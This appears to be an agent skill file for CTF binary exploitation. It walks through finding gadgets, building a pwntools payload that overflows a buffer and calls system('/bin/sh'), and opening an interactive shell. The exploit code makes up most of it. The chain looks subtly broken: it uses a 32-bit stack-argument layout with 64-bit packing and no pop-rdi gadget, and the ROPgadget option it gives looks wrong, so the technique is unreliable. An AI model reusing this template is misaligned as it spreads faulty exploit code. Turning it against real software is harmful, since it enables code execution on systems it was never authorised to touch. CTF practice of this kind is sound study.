---
name: ctf-pwn-rop
description: ROP chain construction and exploitation techniques
tags: [pwn, rop, exploitation, binary]
prerequisites: [binary_file]
---

# CTF Pwn - ROP Chain Exploitation

## When to Use
Use for:
- Bypassing NX/DEP protection
- Calling system functions
- Achieving code execution
- Building complex exploits

## Decision Framework
1. Identify buffer overflow
2. Find gadgets with ROPgadget
3. Build chain to call system()
4. Execute with controlled input

## Execution Steps

### Step 1: Find Gadgets
```bash
ROPgadget --binary ./challenge --noclobber 0x00000000 > gadgets.txt
```

### Step 2: Build ROP Chain
```python
from pwn import *

elf = ELF('./challenge')
rop = ROP(elf)

# Find system and /bin/sh
system = elf.symbols.system
binsh = next(elf.search(b'/bin/sh'))

# Build payload
payload = b'A' * 64  # Offset
payload += p64(system)
payload += p64(binsh)
```

### Step 3: Execute
```python
p = process('./challenge')
p.sendline(payload)
p.interactive()
```

## Expected Output Format
```
ROP Chain Built:
  - Return address: 0x401234 (system)
  - Argument: 0x402000 (/bin/sh)
  - Shell obtained
```

## Common Pitfalls
- Wrong offset crashes without shell
- ASLR may prevent success
- Stack canaries must be bypassed first
- Always test locally before remote
